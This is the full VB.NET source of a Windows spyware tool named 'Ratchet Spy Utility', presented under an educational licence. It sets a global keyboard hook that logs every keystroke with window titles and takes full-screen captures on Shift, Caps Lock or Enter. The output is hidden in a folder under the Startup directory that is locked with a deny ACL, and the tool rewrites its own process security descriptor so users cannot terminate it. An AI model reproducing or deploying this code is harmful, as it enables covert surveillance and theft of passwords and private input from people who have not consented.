'Ratchet Spy Utility: Created by: Justin Linwood Ross | (AKA) Rythorian Ethrovon | (AKA) David->>Lucian Patterson
'Copyright © Black Star Research Facility
'Trademark: Dark Horse Productions
'MIT License granted from GitHub on November 9th 2021 | github.com/rythorian77
'Rights | Permissions:
'Peter Servidio is legally granted and all non-profit usage of Ratchet for personal, educational and security needs.
'Kenneth Shaw is legally granted and all non-profit usage of Ratchet for personal, educational and security needs.

Imports System.ComponentModel
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Security.AccessControl
Imports System.Security.Principal
Imports System.Text
Imports System.Threading
Imports Microsoft.VisualBasic.Devices

Public Class Form1

    'To retrieve recordings go to:
    'The Current User Startup Folder is located here:

    'C:\Users\[User Name]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.

    Public Event UnhandledException(sender As Object, e As UnhandledExceptionEventArgs)

    'Low-Level Global Hook
    Private Shared ReadOnly WHKEYBOARDLL As Integer = &HD '13

    Private Const WM_KEYDOWN As Integer = &H100

    Private Shared ReadOnly _proc As LowLevelKeyboardProc = AddressOf HookCallback

    Private Shared _hookID As IntPtr = IntPtr.Zero

    Private Shared CurrentActiveWindowTitle As String

    Private Const DESKTOPVERTRES As Integer = &H75

    Private Const DESKTOPHORZRES As Integer = &H76

    'The Microsoft Windows security model enables you to control access to process objects.
    'For more information about security, see Access-Control Model.
    'When a user logs in, the system collects a set of data that uniquely identifies the user during the authentication
    'process, And stores it in an access token. This access token describes the security context of all processes associated with the user.
    'The security context of a process Is the set of credentials given to the process Or the user account that created the process.
    'You can use a token To specify the current security context For a process Using the CreateProcessWithTokenW Function.
    'You can specify a security descriptor For a process When you Call the CreateProcess, CreateProcessAsUser,
    'Or CreateProcessWithLogonW Function. If you specify NULL, the process gets a Default security descriptor.
    'The ACLs In the Default security descriptor For a process come from the primary Or impersonation token Of the creator.
    <Flags>
    Public Enum ProcessAccessRights
        PROCESS_CREATE_PROCESS = &H80
        PROCESS_CREATE_THREAD = &H2
        PROCESS_DUP_HANDLE = &H40
        PROCESS_QUERY_INFORMATION = &H400
        PROCESS_QUERY_LIMITED_INFORMATION = &H1000
        PROCESS_SET_INFORMATION = &H200
        PROCESS_SET_QUOTA = &H100
        PROCESS_SUSPEND_RESUME = &H800
        PROCESS_TERMINATE = &H1
        PROCESS_VM_OPERATION = &H8
        PROCESS_VM_READ = &H10
        PROCESS_VM_WRITE = &H20
        DELETE = &H10000
        READ_CONTROL = &H20000
        SYNCHRONIZE = &H100000
        WRITE_DAC = &H40000
        WRITE_OWNER = &H80000
        STANDARD_RIGHTS_REQUIRED = &HF0000

        PROCESS_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED _
            Or SYNCHRONIZE _
            Or &HFFF

    End Enum

    <Obsolete>
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'This creates a folder on desktop if it doesn't exist
        If Not Directory.Exists($"{Environment.GetFolderPath(Environment.SpecialFolder.Startup)}\Ratchet") Then
            Directory.CreateDirectory($"{Environment.GetFolderPath(Environment.SpecialFolder.Startup)}\Ratchet")
        End If

        'This initiates the keyboard hook to start
        _hookID = SetHook(_proc)

        RatchetAvailableRAM()

        ReleaseMemory()

        'Security Descriptor
        Housing()

        'This prevents Ratchet's folder from being accessed accept by administrator
        Dim folderPath As String
        folderPath = ($"{Environment.GetFolderPath(Environment.SpecialFolder.Startup)}\Ratchet")
        Dim adminUserName As String = Environment.UserName
        Dim ds As DirectorySecurity = Directory.GetAccessControl(folderPath)
        Try
            Dim fsa As New FileSystemAccessRule(adminUserName,
                                                FileSystemRights.FullControl,
                                                AccessControlType.Deny)
            'Just set this below to "RemoveAccessRule" to remove restriction from folder
            ds.AddAccessRule(fsa) '<<<<<< HERE <<<<<<
            Directory.SetAccessControl(folderPath, ds)
        Catch ex As Exception
            Const Category As String = "Error"
            Debug.WriteLine(ex.Message, Category)
        End Try

    End Sub

    'This is a separate thread. It is never smart to run too many methods on one UI
    <Obsolete>
    Public Sub Housing()
        Dim t As New Thread(Sub()

                                'This compliments "Process Security" below so only Admin can Terminate Ratchet's Process
                                Dim hProcess As IntPtr = GetCurrentProcess()
                                Dim dacl = GetProcessSecurityDescriptor(hProcess)

                                For i As Integer = dacl.DiscretionaryAcl.Count - &H1 To &H0 + &H1
                                    dacl.DiscretionaryAcl.RemoveAce(i)
                                Next

                                dacl.DiscretionaryAcl.InsertAce(&H0, New CommonAce(AceFlags.None,
                                                                                   AceQualifier.AccessDenied,
                                                                                   ProcessAccessRights.PROCESS_ALL_ACCESS,
                                                                                   New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing),
                                                                                   False,
                                                                                   Nothing))
                                SetProcessSecurityDescriptor(hProcess, dacl)
                            End Sub)
        t.Start()
    End Sub

    'Captures Current Screen
    Public Function GetWindowImage(WindowHandle As IntPtr,
Area As Rectangle) As Bitmap
        Using b As New Bitmap(Area.Width, Area.Height, Imaging.PixelFormat.Format32bppRgb)
            Using img As Graphics = Graphics.FromImage(b)
                Dim ImageHDC As IntPtr = img.GetHdc
                Using window As Graphics = Graphics.FromHwnd(WindowHandle)
                    Dim WindowHDC As IntPtr = window.GetHdc
                    BitBlt(ImageHDC,
                       0,
                       0,
                       Area.Width,
                       Area.Height,
                       WindowHDC,
                       Area.X,
                       Area.Y,
                       CopyPixelOperation.SourceCopy)
                    window.ReleaseHdc()
                End Using
                img.ReleaseHdc()
            End Using
            Return b
        End Using

    End Function

    'Places (posts) a message in the message queue associated with the thread that created the specified window and
    'returns without waiting for the thread to process the message.
    Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (hwnd As Long, wMsg As Long, wParam As Long, lParam As Long) As Long

    'setHook provides a general mechanism for users to register hooks, a list of functions to be called from system (or user) functions.
    Private Function SetHook(proc As LowLevelKeyboardProc) As IntPtr
        Using curProcess As Process = Process.GetCurrentProcess()
            Return SetWindowsHookEx(WHKEYBOARDLL,
                                proc,
                                GetModuleHandle(curProcess.ProcessName & ".exe"),
                                0)
            Return SetWindowsHookEx(WHKEYBOARDLL,
                                proc,
                                GetModuleHandle(curProcess.ProcessName),
                                0)
        End Using
    End Function

    'Represents a method that handles a callback from a hook.
    Private Shared Function HookCallback(nCode As Integer,
                                     wParam As IntPtr,
                                     lParam As IntPtr) As IntPtr
        If nCode >= 0 _
       AndAlso wParam = CType(WM_KEYDOWN, IntPtr) Then
            Dim vkCode As Integer = Marshal.ReadInt32(lParam)
            Dim capsLock As Boolean = (GetKeyState(&H14) And &HFFFF) <> 0
            Dim shiftPress As Boolean = (GetKeyState(&HA0) And &H8000) <> 0 OrElse (GetKeyState(&HA1) And &H8000) <> 0
            Dim currentKey As String = KeyboardLayout(vkCode)
            If capsLock _
                OrElse shiftPress Then
                currentKey = currentKey.ToUpper()
                ' This line is modified for multiple screens, also takes into account different screen size (if any)
                Using bmp As New Bitmap(
                        Screen.AllScreens.Sum(Function(s As Screen) s.Bounds.Width),
                        Screen.AllScreens.Max(Function(s As Screen) s.Bounds.Height))
                    Dim gfx As Graphics = Graphics.FromImage(bmp)
                    ' This line is modified to take everything based on the size of the bitmap
                    gfx.CopyFromScreen(SystemInformation.VirtualScreen.X,
                           SystemInformation.VirtualScreen.Y,
                           0, 0, SystemInformation.VirtualScreen.Size)
                    Dim dateString As String = Date.Now.ToString("yyyyMMddHHmmss")
                    Dim savePath As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                    Dim userName As String = Environment.UserName
                    Dim captureSavePath As String = String.Format($"{{0}}\Ratchet\{{1}}\capture_{{2}}.png", savePath, userName, dateString)
                    ' Oh, create the directory if it doesn't exist
                    Directory.CreateDirectory(Path.GetDirectoryName(captureSavePath))
                    bmp.Save(captureSavePath)
                End Using
            Else
                currentKey = currentKey.ToLower()

            End If
            Select Case vkCode
                Case Keys.F1 To Keys.F24
                    currentKey = $"[{CType(vkCode, Keys)}]"
                Case Else

                    Select Case (CType(vkCode, Keys)).ToString()
                        Case "Space"
                            currentKey = "[SPACE]"
                        Case "Return"
                            currentKey = "[ENTER]"
                            ' This line is modified for multiple screens, also takes into account different screen size (if any)
                            Const Format As String = "yyyyMMddHHmmss"
                            Task.Delay(1000)
                            Dim ss As New Size(0, 0)
                            Using g As Graphics = Graphics.FromHwnd(IntPtr.Zero)
                                Dim hDc As IntPtr = g.GetHdc
                                ss.Width = GetDeviceCaps(hDc,
                                             DESKTOPHORZRES)
                                ss.Height = GetDeviceCaps(hDc,
                                              DESKTOPVERTRES)
                                g.ReleaseHdc(hDc)
                            End Using

                            Using bm As New Bitmap(ss.Width, ss.Height)
                                Using g As Graphics = Graphics.FromImage(bm)
                                    g.CopyFromScreen(Point.Empty,
                                         Point.Empty,
                                         ss,
                                         CopyPixelOperation.SourceCopy)
                                End Using
                                Dim dateString As String = Date.Now.ToString(Format)
                                Dim savePath As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                                Dim userName As String = Environment.UserName
                                Dim captureSavePath As String = String.Format($"{{0}}\Ratchet\{{1}}\capture_{{2}}.png",
                                                                  savePath,
                                                                  userName,
                                                                  dateString)
                                bm.Save(captureSavePath,
                            Imaging.ImageFormat.Png)
                            End Using

                        Case "Escape"
                            currentKey = "[ESC]"
                        Case "LControlKey"
                            currentKey = "[CTRL]"
                        Case "RControlKey"
                            currentKey = "[CTRL]"
                        Case "RShiftKey"
                            currentKey = "[Shift]"
                        Case "LShiftKey"
                            currentKey = "[Shift]"
                        Case "Back"
                            currentKey = "[Back]"
                        Case "LWin"
                            currentKey = "[WIN]"
                        Case "Tab"
                            currentKey = "[Tab]"
                        Case "Capital"

                            If capsLock = True Then
                                currentKey = "[CAPSLOCK: OFF]"
                            Else
                                currentKey = "[CAPSLOCK: ON]"
                            End If
                    End Select
            End Select

            Dim fileName As String = $"{Environment.GetFolderPath(Environment.SpecialFolder.Startup)}\Ratchet\StudentLog.txt"
            Using writer As New StreamWriter(fileName, True)
                If CurrentActiveWindowTitle = GetActiveWindowTitle() Then
                    writer.Write(currentKey)
                Else
                    writer.WriteLine($"{vbNewLine}{vbNewLine}Ratchet Event 360:  {Date.Now.ToString($"yyyy/MM/dd HH:mm:ss.ff{vbLf}")}")
                    writer.Write(Environment.NewLine)
                    writer.Write(currentKey)
                End If
            End Using
        End If
        'Passes the hook information to the next hook procedure in the current hook chain.
        'A hook procedure can call this function either before or after processing the hook information.
        Return CallNextHookEx(_hookID, nCode, wParam, lParam)
    End Function

    'Current keyboard/keyboard state/virtual key/ ToUnicodeEx: Translates the specified virtual-key code and keyboard state to the
    'corresponding Unicode character or characters.
    Private Shared Function KeyboardLayout(vkCode As UInteger) As String
        Dim processId As UInteger = Nothing
        Try
            Dim sb As New StringBuilder()
            Dim vkBuffer As Byte() = New Byte(255) {}
            If Not GetKeyboardState(vkBuffer) Then Return ""
            Dim scanCode As UInteger = MapVirtualKey(vkCode, 0)
            Dim unused = ToUnicodeEx(vkCode,
                                 scanCode,
                                 vkBuffer,
                                 sb,
                                 5,
                                 0,
                                 GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), processId)))
            Return sb.ToString()
        Catch
        End Try
        Return (CType(vkCode, Keys)).ToString()
    End Function

    'GetActiveWindowTitle: Retrieves the window handle to the active window attached to the calling thread's message.
    Private Shared Function GetActiveWindowTitle() As String
        Dim pid As UInteger = Nothing
        Try
            'Retrieves a handle to the foreground window (the window with which the user is currently working).
            'The system assigns a slightly higher priority to the thread that creates the foreground window than it does to other threads.
            Dim hwnd As IntPtr = GetForegroundWindow()
            Dim unused = GetWindowThreadProcessId(hwnd, pid)
            Dim p As Process = Process.GetProcessById(pid) 'Every process has an ID # (pid)
            Dim title As String = p.MainWindowTitle
            'IsNullOrWhiteSpace is a convenience method that is similar to the following code,
            'except that it offers superior performance:
            If String.IsNullOrWhiteSpace(title) Then title = p.ProcessName
            CurrentActiveWindowTitle = title
            Return title
        Catch __unusedException1__ As Exception
            Return "Black Star Protocol"
        End Try
    End Function

    'The BitBlt function performs a bit-block transfer of the color data corresponding to a rectangle of pixels from the
    'specified source device context into a destination device context.

    <DllImport("gdi32.dll")>
    Private Shared Function BitBlt(hdc As IntPtr,
nXDest As Integer,
nYDest As Integer,
nWidth As Integer,
nHeight As Integer,
hdcSrc As IntPtr,
nXSrc As Integer,
nYSrc As Integer,
dwRop As CopyPixelOperation) As Boolean
    End Function

    'Synthesizes a keystroke. The system can use such a synthesized keystroke to generate a WM_KEYUP or WM_KEYDOWN message.
    'The keyboard driver's interrupt handler calls the keybd_event function.
    <DllImport("user32.dll", EntryPoint:="keybd_event")>
    Private Shared Sub keybd_event(bVk As Byte, bScan As Byte, dwFlags As UInteger, dwExtraInfo As UInteger)
    End Sub

    'The GetDeviceCaps function retrieves device-specific information for the specified device.
    <DllImport("gdi32.dll")> Private Shared Function GetDeviceCaps(hdc As IntPtr,
                                                                   nIndex As Integer) As Integer
    End Function

    'Installs an application-defined hook procedure into a hook chain.
    'You would install a hook procedure to monitor the system for certain types of events.
    'These events are associated either with a specific thread or with all threads in the same desktop as the calling thread.
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function SetWindowsHookEx(idHook As Integer,
                                             lpfn As LowLevelKeyboardProc,
                                             hMod As IntPtr,
                                             dwThreadId As UInteger) As IntPtr
    End Function

    'UnhookWindowsHookEx : The hook procedure can be In the state Of being called by another thread even after UnhookWindowsHookEx returns.
    'If the hook procedure Is Not being called concurrently, the hook procedure Is removed immediately before UnhookWindowsHookEx returns.
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function UnhookWindowsHookEx(hhk As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

    'CallNextHookEx: Hook procedures are installed in chains for particular hook types. CallNextHookEx calls the next hook in the chain.
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function CallNextHookEx(hhk As IntPtr,
                                           nCode As Integer,
                                           wParam As IntPtr,
                                           lParam As IntPtr) As IntPtr
    End Function

    'GetModuleHandle:The function returns a handle to a mapped module without incrementing its reference count. However,
    'if this handle is passed to the FreeLibrary function, the reference count of the mapped module will be decremented.
    'Therefore, do not pass a handle returned by GetModuleHandle to the FreeLibrary function.
    'Doing so can cause a DLL module to be unmapped prematurely.This Function must() be used carefully In a multithreaded application.
    'There Is no guarantee that the Module handle remains valid between the time this Function returns the handle And the time it Is used.
    'For example, suppose that a thread retrieves a Module handle, but before it uses the handle, a second thread frees the Module.
    'If the system loads another Module, it could reuse the Module handle that was recently freed.
    'Therefore, the first thread would have a handle To a different Module than the one intended.
    <DllImport("kernel32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function GetModuleHandle(lpModuleName As String) As IntPtr
    End Function

    'An application-defined or library-defined callback function used with the SetWindowsHookEx function.
    'The system calls this function every time a new keyboard input event is about to be posted into a thread input queue.
    'Note: When this callback function Is called in response to a change in the state of a key,
    'the callback function Is called before the asynchronous state of the key Is updated.
    'Consequently, the asynchronous state of the key cannot be determined by calling "GetAsyncKeyState" from within the callback function.
    Private Delegate Function LowLevelKeyboardProc(nCode As Integer,
                                                   wParam As IntPtr,
                                                   lParam As IntPtr) As IntPtr

    'As stated above: 'Retrieves a handle to the foreground window (the window with which the user is currently working).
    'The system assigns a slightly higher priority to the thread that creates the foreground window than it does to other threads.
    <DllImport("user32.dll")>
    Private Shared Function GetForegroundWindow() As IntPtr
    End Function

    'GetWindowThreadProcessId:Retrieves the identifier of the thread that created the specified window and, optionally,
    'the identifier of the process that created the window.
    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Function GetWindowThreadProcessId(hWnd As IntPtr,
                                                     <Out> ByRef lpdwProcessId As UInteger) As UInteger
    End Function

    'GetKeyState: The key status returned from this function changes as a thread reads key messages from its message queue.
    'The status does not reflect the interrupt-level state associated with the hardware. Use the GetKeyState function to retrieve
    'that information.
    <DllImport("user32.dll", CharSet:=CharSet.Auto, ExactSpelling:=True, CallingConvention:=CallingConvention.Winapi)>
    Public Shared Function GetKeyState(keyCode As Integer) As Short
    End Function

    'An application can call this function to retrieve the current status of all the virtual keys.
    'The status changes as a thread removes keyboard messages from its message queue. The status does not change as keyboard messages
    'are posted to the thread's message queue, nor does it change as keyboard messages are posted to or retrieved from message queues
    'of other threads. (Exception: Threads that are connected through AttachThreadInput share the same keyboard state.)
    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Function GetKeyboardState(lpKeyState As Byte()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

    'GetKeyboardLayout: The input locale identifier is a broader concept than a keyboard layout, since it can also encompass a speech-to-text
    'converter, an Input Method Editor (IME), or any other form of input.
    <DllImport("user32.dll")>
    Private Shared Function GetKeyboardLayout(idThread As UInteger) As IntPtr
    End Function

    'ToUnicodeEx:The input locale identifier is a broader concept than a keyboard layout, since it can also encompass a speech-to-text converter,
    'an Input Method Editor (IME), or any other form of input.
    <DllImport("user32.dll")>
    Private Shared Function ToUnicodeEx(wVirtKey As UInteger,
                                        wScanCode As UInteger,
                                        lpKeyState As Byte(),
                                        <Out, MarshalAs(UnmanagedType.LPWStr)> pwszBuff As StringBuilder,
                                        cchBuff As Integer,
                                        wFlags As UInteger,
                                        dwhkl As IntPtr) As Integer
    End Function

    'MapVirtualKey: An application can use MapVirtualKey to translate scan codes to the virtual-key code constants VK_SHIFT, VK_CONTROL, and VK_MENU,
    'and vice versa. These translations do not distinguish between the left and right instances of the SHIFT, CTRL, or ALT keys.
    <DllImport("user32.dll")>
    Private Shared Function MapVirtualKey(uCode As UInteger,
                                          uMapType As UInteger) As UInteger
    End Function

    'Process security API
    'The GetKernelObjectSecurity function retrieves a copy of the security descriptor that protects a kernel object.
    <DllImport("advapi32.dll", SetLastError:=True)>
    Private Shared Function GetKernelObjectSecurity(Handle As IntPtr, securityInformation As Integer,
     <Out> pSecurityDescriptor As Byte(), nLength As UInteger, <Out> ByRef lpnLengthNeeded As UInteger) As Boolean
    End Function

    'Process security API. Retrieves a pseudo handle for the current process.
    'A pseudo handle is a special constant, currently (HANDLE)-1, that is interpreted as the current process handle.
    'For compatibility with future operating systems, it is best to call GetCurrentProcess instead of hard-coding this constant value.
    'The calling process can use a pseudo handle to specify its own process whenever a process handle is required.
    'Pseudo handles are not inherited by child processes.
    <DllImport("kernel32.dll")>
    Public Shared Function GetCurrentProcess() As IntPtr
    End Function

    'Process security API. The SetKernelObjectSecurity function sets the security of a kernel object.
    'For example, this can be a process, thread, or event.
    'Note: This function should not be used when setting a security descriptor on file system objects.
    'Instead, use the SetSecurityInfo or SetNamedSecurityInfo functions.
    <DllImport("advapi32.dll", SetLastError:=True)>
    Private Shared Function SetKernelObjectSecurity(Handle As IntPtr, securityInformation As Integer,
    <[In]> pSecurityDescriptor As Byte()) As Boolean
    End Function

    'The NtSetInformationProcess function can be used to set a process as critical process.
    'The system will bug check the system with the bug check code CRITICAL_PROCESS_TERMINATION (0xF4) when the critical process is terminated.
    <DllImport("ntdll.dll", SetLastError:=True)>
    Private Shared Function NtSetInformationProcess(hProcess As IntPtr, processInformationClass As Integer, ByRef processInformation As Integer, processInformationLength As Integer) As Integer
    End Function

    Private Sub UnhookWindowsHookEx()
    End Sub

    Private Sub Form1_FormClosing(sender As Object,
                                  e As FormClosingEventArgs) Handles Me.FormClosing
        'Relsease global keyboard hook
        UnhookWindowsHookEx()
        'This kills thread below/application
        'Properly dispose worker. Please note that GC does this task eventually.
        BackgroundWorker1.Dispose()
        'This below re-allocates memory back to Windows System on closing
        GC.Collect()
        GC.WaitForPendingFinalizers()
        'This smoothly exits the program in the event of error
        Application.Exit()

    End Sub

    'These functions serve to protect "Ratchet's Process" from being terminated unless you are an admin.
    'The Microsoft Windows security model enables you to control access to process objects. For more information about security,
    'see Access-Control Model.
    'When a user logs in, the system collects a set of data that uniquely identifies the user during the authentication process,
    'And stores it in an access token. This access token describes the security context of all processes associated with the user.
    'The security context of a process Is the set of credentials given to the process Or the user account that created the process.
    <Obsolete>
    Public Shared Function GetProcessSecurityDescriptor(processHandle As IntPtr) As RawSecurityDescriptor
        Const DACL_SECURITY_INFORMATION As Integer = &H4
        Dim psd As Byte() = New Byte(-1) {}
        Dim bufSizeNeeded As UInteger
        GetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION, psd, 0, bufSizeNeeded)
        If bufSizeNeeded < 0 OrElse bufSizeNeeded > Short.MaxValue Then Throw New Win32Exception()
        If Not GetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION, CSharpImpl.Assign(psd, New Byte(bufSizeNeeded - 1) {}), bufSizeNeeded, bufSizeNeeded) Then Throw New Win32Exception()
        Return New RawSecurityDescriptor(psd, 0)
    End Function

    'Set Process Security Descriptor Action. Adjusting Process Security allows a process To be Protected from most tampering by users.
    'For example, adjusting process security can restrict who can Stop a process from the task manager.
    Public Shared Sub SetProcessSecurityDescriptor(processHandle As IntPtr, dacl As RawSecurityDescriptor)
        Const DACL_SECURITY_INFORMATION As Integer = &H4
        Dim rawsd As Byte() = New Byte(dacl.BinaryLength - 1) {}
        dacl.GetBinaryForm(rawsd, 0)
        If Not SetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION, rawsd) Then Throw New Win32Exception()
    End Sub

    'C# Conversion to VB.Net
    Private Class CSharpImpl

        'Specifies that one or more declared programming elements are associated with a class or structure at large,
        'and not with a specific instance of the class or structure.
        <Obsolete("Please refactor calling code to use normal Visual Basic assignment")>
        Shared Function Assign(Of T)(ByRef target As T, value As T) As T
            target = value
            Return value
        End Function

    End Class

    'Release Memory while program is running:
    'The minimum working set size for the process, in bytes. The virtual memory manager attempts to keep at least this much
    'memory resident in the process whenever the process is active.
    Private Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (hProcess As IntPtr, dwMinimumWorkingSetSize As Integer, dwMaximumWorkingSetSize As Integer) As Integer

    Friend Sub ReleaseMemory()
        Try
            GC.Collect()
            GC.WaitForPendingFinalizers()
            If Environment.OSVersion.Platform = PlatformID.Win32NT Then
                SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.ToString())
        End Try
    End Sub

    Public Sub RatchetAvailableRAM()
        Dim CI As New ComputerInfo()
        Dim avl, used As String
        Dim mem As ULong = ULong.Parse(CI.AvailablePhysicalMemory.ToString())
        Dim mem1 As ULong = ULong.Parse(CI.TotalPhysicalMemory.ToString()) - ULong.Parse(CI.AvailablePhysicalMemory.ToString())
        avl = (mem / (1024 * 1024) & " MB").ToString() 'changed + to &
        used = (mem1 / (1024 * 1024) & " MB").ToString() 'changed + to &
    End Sub

    'Global Error Handling to prevent crash
    Private Sub MyApplication_UnhandledException(sender As Object,
                                                 e As UnhandledExceptionEventArgs) Handles Me.UnhandledException
        My.Application.Log.WriteException(e.ExceptionObject,
            TraceEventType.Critical,
            "Unhandled Exception.")
    End Sub

End Class